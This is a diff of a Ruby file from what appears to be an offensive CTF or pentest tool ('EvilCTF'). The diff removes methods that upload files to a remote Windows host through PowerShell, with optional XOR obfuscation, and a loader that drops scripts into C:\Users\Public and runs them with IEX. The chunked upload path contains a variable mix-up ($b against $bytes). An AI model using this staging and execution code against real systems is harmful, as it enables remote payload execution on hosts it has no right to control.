@@ -770,61 +770,6 @@ end
       'unknown'
     end
   end
-  def self.upload_file(local_path, remote_path, shell, encrypt: false, chunk_size: 40000)
-    return false unless File.exist?(local_path)
-    content = File.binread(local_path)
-    content = EvilCTF::Crypto.xor_crypt(content) if encrypt
-    base64_content = Base64.strict_encode64(content)
-    # Normalize Windows paths for PowerShell
-    normalized_remote_path = remote_path.gsub('\\', '/')
-    # Small file – single shot
-    if base64_content.length <= chunk_size
-      ps_single = <<~PS
-        try {
-          $bytes = [Convert]::FromBase64String('#{base64_content}')
-          New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
-          [System.IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
-          "SUCCESS"
-        } catch {
-          "ERROR: $($_.Exception.Message)"
-        }
-      PS
-      result = shell.run(ps_single)
-      return false unless result.output.include?('SUCCESS')
-    else
-      # Chunked upload
-      ps_init = <<~PS
-        try {
-          New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
-          "INIT"
-        } catch {
-          "ERROR: $($_.Exception.Message)"
-        }
-      PS
-      init = shell.run(ps_init)
-      return false unless init.output.include?('INIT')
-      chunks = base64_content.scan(/.{1,#{chunk_size}}/)
-      chunks.each_with_index do |chunk, idx|
-        ps_chunk = <<~PS
-          try {
-            $b = [Convert]::FromBase64String('#{chunk}')
-            [IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
-            "CHUNK #{idx}"
-          } catch {
-            "ERROR: $($_.Exception.Message)"
-          }
-        PS
-        result = shell.run(ps_chunk)
-        return false unless result.output.include?("CHUNK #{idx}")
-      end
-    end
-    # Final verification
-    verify = shell.run("if (Test-Path '#{normalized_remote_path}') { 'EXISTS' } else { 'MISSING' }")
-    verify.output.include?('EXISTS')
-  end
-  def self.xor_crypt(data, key = 0x42)
-    data.bytes.map { |b| (b ^ key).chr }.join
-  end
   
 
   def self.load_config_profile(name)
@@ -900,21 +845,4 @@ end
     end
   end
 
-  def self.load_ps1(local_ps1, shell)
-    return false unless File.exist?(local_ps1)
-    remote = 'C:\\Users\\Public\\' + File.basename(local_ps1)
-    if upload_file(local_ps1, remote, shell)
-      begin
-        result = shell.run("IEX (Get-Content '#{remote}' -Raw)")
-        puts result.output
-        true
-      rescue => e
-        puts "[!] PS1 load failed: #{e.message}"
-        false
-      end
-    else
-      puts "[!] Upload failed for #{local_ps1}"
-      false
-    end
-  end
 end
